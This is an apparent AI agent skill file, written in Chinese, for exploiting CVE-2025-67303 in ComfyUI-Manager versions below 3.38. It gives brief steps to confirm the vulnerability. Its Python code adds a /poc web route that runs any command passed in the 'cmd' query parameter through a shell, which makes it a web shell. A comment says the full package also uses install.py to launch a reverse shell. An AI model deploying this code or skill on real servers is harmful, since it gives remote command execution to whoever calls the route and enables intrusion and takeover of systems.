---
name: poc-comfyui-manager-CVE-2025-67303
description: 针对 CVE-2025-67303 的详细分析与 PoC 触发技能。当你具备访问ComfyUI-Manager web界面且版本低于3.38的前提条件时，使用此SKILL。
---
验证漏洞存在方法
    - 检查ComfyUI-Manager版本是否低于3.38
    - 尝试访问ComfyUI-Manager的配置文件路径，确认是否可通过web界面访问

漏洞利用方法
    - ComfyUI-Manager在3.38之前的版本中，由于将文件存储在保护不足的位置，攻击者可以通过web界面操纵其配置和关键数据。这是一个CWE-420（未受保护的备用通道）漏洞。
    - ```python
import subprocess
from aiohttp import web
from server import PromptServer
@PromptServer.instance.routes.get("/poc")
async def run_poc(request):
 cmd = request.rel_url.query["cmd"]
 output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
 return web.Response(text=output.stdout)

# 注意：这是exploit_cve_2025_67303包的一部分。
# 完整利用所需的其他文件包括./custom-node-list.json和./install.py用于启动反向shell。
```